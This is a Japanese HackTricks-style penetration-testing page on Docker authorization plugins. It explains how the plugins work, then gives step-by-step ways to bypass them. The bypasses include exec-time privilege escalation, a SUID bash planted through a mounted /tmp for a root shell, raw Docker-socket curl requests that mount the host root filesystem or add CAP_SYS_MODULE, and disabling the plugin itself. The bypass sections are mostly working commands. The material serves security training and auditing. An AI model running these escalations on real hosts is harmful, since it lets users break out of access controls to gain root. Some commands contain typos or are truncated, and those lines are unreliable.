<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>でAWSハッキングをゼロからヒーローまで学ぶ！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>


**Dockerの**デフォルトの**認可**モデルは**すべてまたは何も**です。Dockerデーモンにアクセス権限を持つ任意のユーザーは**任意の**Dockerクライアント**コマンド**を実行できます。DockerのEngine APIを使用してデーモンに連絡する呼び出し元にも同じことが当てはまります。より**細かいアクセス制御**が必要な場合、**認可プラグイン**を作成してDockerデーモン構成に追加できます。認可プラグインを使用すると、Docker管理者はDockerデーモンへのアクセスを管理するための**細かいアクセス**ポリシーを構成できます。

# 基本的なアーキテクチャ

Docker Authプラグインは**外部**の**プラグイン**であり、Dockerデーモンに要求された**アクション**に**依存**して、要求された**ユーザー**に**許可/拒否**することができます。

**[以下の情報はドキュメントから取得](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

CLIを介してまたはEngine APIを介してDockerデーモンに**HTTP** **リクエスト**が行われると、**認証** **サブシステム**はインストールされた**認証** **プラグイン**にリクエストを渡します。リクエストにはユーザー（呼び出し元）とコマンドコンテキストが含まれます。**プラグイン**はリクエストを**許可**または**拒否**する責任があります。

以下のシーケンス図は許可および拒否の認可フローを示しています：

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)

プラグインに送信される各リクエストには、認証されたユーザー、HTTPヘッダー、およびリクエスト/レスポンスボディが含まれます。プラグインに渡されるのは**ユーザー名**と使用された**認証方法**だけです。最も重要なのは、ユーザーの**資格情報**やトークンは渡されないことです。最後に、認可プラグインに送信されるのは**すべてのリクエスト/レスポンスボディではなく**、`Content-Type`が`text/*`または`application/json`であるリクエスト/レスポンスボディのみです。

HTTP接続を乗っ取る可能性のあるコマンド（`HTTP Upgrade`など）に対して、`exec`のようなHTTP接続を乗っ取る可能性のあるコマンドに対しては、認可プラグインは最初のHTTPリクエストのみに対して呼び出されます。プラグインがコマンドを承認すると、残りのフローには認可が適用されません。具体的には、ストリーミングデータは認可プラグインに渡されません。`logs`や`events`などのチャンク化されたHTTPレスポンスを返すコマンドに対しては、HTTPリクエストのみが認可プラグインに送信されます。

リクエスト/レスポンス処理中、一部の認可フローではDockerデーモンへの追加のクエリが必要になる場合があります。このようなフローを完了するために、プラグインは通常のユーザーと同様にデーモンAPIを呼び出すことができます。これらの追加のクエリを有効にするには、プラグインは管理者が適切な認証およびセキュリティポリシーを構成できる手段を提供する必要があります。

## 複数のプラグイン

Dockerデーモンの**起動**時に**プラグイン**を**登録**する責任があります。**複数のプラグインをインストールして連結**することができます。このチェーンは順序付けられることがあります。デーモンへの各リクエストは、チェーンを通過して順番に処理されます。リソースへのアクセスがすべてのプラグインによって許可された場合のみ、アクセスが許可されます。

# プラグインの例

## Twistlock AuthZ Broker

プラグイン[**authz**](https://github.com/twistlock/authz)を使用すると、**JSON**ファイルを作成して**リクエストを認可**するために**プラグイン**が**読み取る**ことができます。したがって、各ユーザーがどのAPIエンドポイントに到達できるかを非常に簡単に制御できます。

以下は、AliceとBobが新しいコンテナを作成できるようにする例です：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go)ページでは、要求されたURLとアクションの関係を見つけることができます。[types.go](https://github.com/twistlock/authz/blob/master/core/types.go)ページでは、アクション名とアクションの関係を見つけることができます。

## シンプルなプラグインチュートリアル

インストールとデバッグに関する詳細な情報が記載されている**理解しやすいプラグイン**をこちらで見つけることができます：[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

動作方法を理解するには、`README`と`plugin.go`のコードを読んでください。

# Docker Authプラグインのバイパス

## アクセスの列挙

**許可されているエンドポイント**と**許可されているHostConfigの値**を確認する主なポイントです。

この列挙を実行するには、[**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)というツールを使用できます。

## `run --privileged`の不許可

### 最小権限
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### コンテナを実行して特権セッションを取得する

この場合、システム管理者はユーザーがボリュームをマウントしたり、`--privileged`フラグを使用してコンテナを実行したり、コンテナに追加の権限を付与することを禁止しています。
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
しかし、ユーザーは実行中のコンテナ内でシェルを作成し、追加の特権を与えることができます:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
現在、ユーザーは[**以前に議論されたテクニック**](./#privileged-flag)のいずれかを使用してコンテナから脱出し、ホスト内で特権を**昇格**することができます。

## 書き込み可能フォルダのマウント

この場合、システム管理者はユーザーに`--privileged`フラグを使用してコンテナを実行することを禁止し、コンテナに追加の権限を与えることを許可せず、`/tmp`フォルダのみをマウントすることを許可しました。
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
`/tmp`フォルダをマウントできない場合がありますが、**別の書き込み可能なフォルダ**をマウントできます。書き込み可能なディレクトリを見つけるには、`find / -writable -type d 2>/dev/null`を使用できます。

**すべてのLinuxマシンのディレクトリがsuidビットをサポートしているわけではないことに注意してください！** suidビットをサポートしているディレクトリを確認するには、`mount | grep -v "nosuid"`を実行します。たとえば、通常、`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`、`/var/lib/lxcfs`はsuidビットをサポートしていません。

また、**`/etc`をマウント**したり、**構成ファイルを含む他のフォルダ**をマウントできる場合は、それらをdockerコンテナ内でrootとして変更して、ホストで**悪用して特権を昇格**することができます（たとえば、`/etc/shadow`を変更することができます）。
{% endhint %}

## 未チェックのAPIエンドポイント

このプラグインを構成するシスアドの責任は、各ユーザーがどのアクションをどの特権で実行できるかを制御することです。したがって、管理者がエンドポイントと属性に**ブラックリスト**アプローチを取る場合、攻撃者が**特権を昇格**させる可能性があるいくつかのエンドポイントを**見落とす**可能性があります。

Docker APIは[https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)で確認できます。

## 未チェックのJSON構造

### ルートでのバインド

シスアドがDockerファイアウォールを構成する際に、[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)の重要なパラメータである「**Binds**」を**見落とした**可能性があります。\
次の例では、この構成ミスを悪用して、ホストのルート（/）フォルダをマウントするコンテナを作成および実行することができます。
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
この例では、JSON内のルートレベルのキーとして **`Binds`** パラメータを使用していますが、APIでは **`HostConfig`** キーの下に表示されていることに注意してください。
{% endhint %}

### HostConfig内のBinds

**ルート内のBinds** と同じ手順に従い、Docker APIにこの **リクエスト** を実行してください：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### ルートでのマウント

**ルートでのバインド**と同じ手順に従い、次の**リクエスト**をDocker APIに送信します：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfig内のマウント

**ルートのバインド**と同じ手順に従い、Docker APIにこの**リクエスト**を実行します：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## 未チェックのJSON属性

システム管理者がDockerファイアウォールを設定する際に、[API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)の**Capabilities**内の**HostConfig**などの重要な属性を**見落としてしまった**可能性があります。次の例では、この設定ミスを悪用して、**SYS_MODULE**機能を持つコンテナを作成して実行することが可能です。
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`**は通常、コンテナから脱出するための**興味深い権限**を含んでいるキーです。ただし、以前に議論したように、それ以外のBindsの使用方法によっても制限をバイパスすることができることに注意してください。
{% endhint %}

## プラグインの無効化

**システム管理者**が**プラグイン**の**無効化**を**禁止**するのを**忘れて**いた場合、これを利用して完全に無効にすることができます！
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
## 著者プラグインバイパスの解説

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# 参考文献

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
